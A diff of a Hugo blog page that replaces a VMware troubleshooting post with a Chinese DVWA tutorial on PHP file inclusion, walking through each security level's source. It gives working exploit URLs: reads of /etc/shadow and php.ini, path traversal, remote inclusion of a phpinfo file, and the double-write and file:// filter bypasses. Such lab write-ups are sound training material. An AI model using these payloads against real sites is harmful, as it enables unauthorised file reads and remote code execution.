@@ -22,7 +22,7 @@
 <meta name="theme-color" content="#ffffff" />
 
 
-<title>关于VMware由15版本更新到16版本的报错问题 - Phoenix-Pl’s Blog</title>
+<title>从DVWA看文件包含漏洞 - Phoenix-Pl’s Blog</title>
 
 
 <meta name="author" content="DSRKafuU" />
@@ -31,14 +31,14 @@
 <meta name="description" content="A minimal Hugo theme with nice theme color." />
 
 
-<meta name="keywords" content="奇奇怪怪的问题" />
+<meta name="keywords" content="DVWA" />
 
 
-<meta property="og:title" content="关于VMware由15版本更新到16版本的报错问题" />
-<meta name="twitter:title" content="关于VMware由15版本更新到16版本的报错问题" />
+<meta property="og:title" content="从DVWA看文件包含漏洞" />
+<meta name="twitter:title" content="从DVWA看文件包含漏洞" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://Phoenix-Pl.github.io/post/vmware%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/" /><meta property="og:description" content="报错1 无法打开内核设备“\.\VMCIDev\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗? 这里打开以.vmx结尾的文件，如下图 搜索 vmci0.present，把后面的 TRUE 替换成 FALSE，" />
-<meta name="twitter:description" content="报错1 无法打开内核设备“\.\VMCIDev\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗? 这里打开以.vmx结尾的文件，如下图 搜索 vmci0.present，把后面的 TRUE 替换成 FALSE，" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/dvwainclude/" /><meta property="og:description" content="File Inclusion File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_on" />
+<meta name="twitter:description" content="File Inclusion File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_on" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
 
@@ -98,32 +98,134 @@
 <article>
     
     <h2 class="post-item post-title">
-        <a href="https://Phoenix-Pl.github.io/post/vmware%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/">关于VMware由15版本更新到16版本的报错问题</a>
+        <a href="https://Phoenix-Pl.github.io/post/dvwainclude/">从DVWA看文件包含漏洞</a>
     </h2>
     <div class="post-item post-meta">
-        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;229 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98">奇奇怪怪的问题</a>&nbsp;</span>
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;1505 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/dvwa">DVWA</a>&nbsp;</span>
 
     </div>
     
     <div class="post-content markdown-body">
-        <h2 id="报错1">报错1</h2>
-<p>无法打开内核设备“\.\VMCIDev\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗?</p>
-<p>这里打开以.vmx结尾的文件，如下图</p>
-<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201122182915399.png#pic_center" alt="在这里插入图片描述" />
+        <h2 id="file-inclusion"><strong>File Inclusion</strong></h2>
+<p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h2 id="low">Low</h2>
+<pre><code class="language-php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+?&gt; 
+</code></pre>
+<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p><img class="img-zoomable" src="F:%5cnote%5cimg%5c20210228113703337.png" alt="在这里插入图片描述" />
 </p>
-<p>搜索 <code>vmci0.present</code>，把后面的 <code>TRUE</code> 替换成 <code>FALSE</code>，如下图：</p>
-<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201122183028375.png#pic_center" alt="在这里插入图片描述" />
+<p>点击file1.php后，显示如下</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210228113735428.png" alt="在这里插入图片描述" />
 </p>
-<p>再打开就好</p>
-<h2 id="报错2">报错2</h2>
-<p><strong>errors:</strong></p>
-<blockquote>
-<p>VMware Workstation 不可恢复错误: (vmx)</p>
-<p>Exception 0xc0000006 (disk error while paging) has occurred.</p>
-<p>日志文件位于“K:\vmware\centos\vmware.log”中。</p>
-<p>您可以请求支持。</p>
-</blockquote>
-<p>因为我当时的虚拟机都是处于挂起状态，这里直接给当前虚拟机关机，再启动就好，看了看里面的快照什么的也没有丢失</p>
+<p>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
+<h3 id="漏洞利用"><strong>漏洞利用</strong></h3>
+<p>1、本地文件包含</p>
+<p>构造url</p>
+<pre><code class="language-http">http://localhost/DVWA-master/vulnerabilities/fi/?page=/etc/shadow
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210228114036401.png" alt="在这里插入图片描述" />
+</p>
+<p>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<em>E:\phpstudy\phpstudy_pro</em> 。</p>
+<p>构造url（绝对路径）<em>E:\phpstudy\phpstudy_pro</em></p>
+<pre><code class="language-http">http://localhost/DVWA-master/vulnerabilities/fi/?page=E:\phpstudy\phpstudy_pro\PHPTutorial\WWW\DVWA-master\php.ini
+</code></pre>
+<p>成功读取了服务器的php.ini文件</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210228114357342.png" alt="在这里插入图片描述" />
+</p>
+<p>构造url（相对路径）</p>
+<pre><code class="language-php">http://192.168.138.128/DVWA-master/vulnerabilities/fi/?page=..\..\phpinfo.php
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2021022812421684.png" alt="在这里插入图片描述" />
+</p>
+<p>2、远程文件包含</p>
+<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<p>在本地服务器<code>127.0.0.1</code>上传一个<code>phpinfo.txt</code>文件，内容如下</p>
+<pre><code class="language-php">&lt;?php
+ phpinfo(); 
+?&gt;
+</code></pre>
+<p>构造url</p>
+<pre><code class="language-php">http://192.168.43.73/DVWA-master/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210228130147786.png" alt="在这里插入图片描述" />
+</p>
+<h2 id="medium">Medium</h2>
+<pre><code class="language-php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+
+?&gt; 
+</code></pre>
+<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
+<h3 id="漏洞利用-1"><strong>漏洞利用</strong></h3>
+<p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</p>
+<p>例如page=<a href="http://www.example.com" target="_blank">hthttp://tp://192.168.43.73/phpinfo.txt</a>时，str_replace函数会将http://删除，于是page=http://192.168.43.73/phpinfo.txt，成功执行远程命令。</p>
+<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
+<p>1.本地文件包含</p>
+<pre><code class="language-php">http://192.168.138.128/DVWA-master/vulnerabilities/fi/?page=..././..././php.ini
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2021022813091473.png" alt="在这里插入图片描述" />
+</p>
+<p>2、远程文件包含</p>
+<pre><code class="language-http">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20210228131844806.png" alt="在这里插入图片描述" />
+</p>
+<h2 id="high">High</h2>
+<pre><code class="language-php">&lt;?php
+
+if(!function_exists('fnmatch')) {
+   function fnmatch($pattern, $string) {
+     return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, '#'),array('\*' =&gt; '.*', '\?'=&gt; '.')).&quot;$#i&quot;, $string); 
+     } // end
+} // end if
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
+    // This isn't the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt; 
+</code></pre>
+<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<h3 id="漏洞利用-2">漏洞利用</h3>
+<p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。</p>
+<p>构造url</p>
+<pre><code>http://192.168.138.128/DVWA-master/vulnerabilities/fi/?page=file:///../../php.ini
+</code></pre>
+<p>利用file协议绕过</p>
+<h2 id="impossible">Impossible</h2>
+<pre><code class="language-php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {
+    // This isn't the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt; 
+</code></pre>
+<p>可以看到，impossible级别的代码使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生</p>
 
     </div>
 </article>
@@ -224,8 +326,23 @@
     <div class="sidebar-item sidebar-toc">
         <h3>目录</h3><nav id="TableOfContents">
   <ul>
-    <li><a href="#报错1">报错1</a></li>
-    <li><a href="#报错2">报错2</a></li>
+    <li><a href="#file-inclusion"><strong>File Inclusion</strong></a></li>
+    <li><a href="#low">Low</a>
+      <ul>
+        <li><a href="#漏洞利用"><strong>漏洞利用</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#medium">Medium</a>
+      <ul>
+        <li><a href="#漏洞利用-1"><strong>漏洞利用</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#high">High</a>
+      <ul>
+        <li><a href="#漏洞利用-2">漏洞利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#impossible">Impossible</a></li>
   </ul>
 </nav></div>
 </aside>
@@ -331,8 +448,23 @@
         <h3>目录</h3>
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#报错1">报错1</a></li>
-    <li><a href="#报错2">报错2</a></li>
+    <li><a href="#file-inclusion"><strong>File Inclusion</strong></a></li>
+    <li><a href="#low">Low</a>
+      <ul>
+        <li><a href="#漏洞利用"><strong>漏洞利用</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#medium">Medium</a>
+      <ul>
+        <li><a href="#漏洞利用-1"><strong>漏洞利用</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#high">High</a>
+      <ul>
+        <li><a href="#漏洞利用-2">漏洞利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#impossible">Impossible</a></li>
   </ul>
 </nav>
     </div>
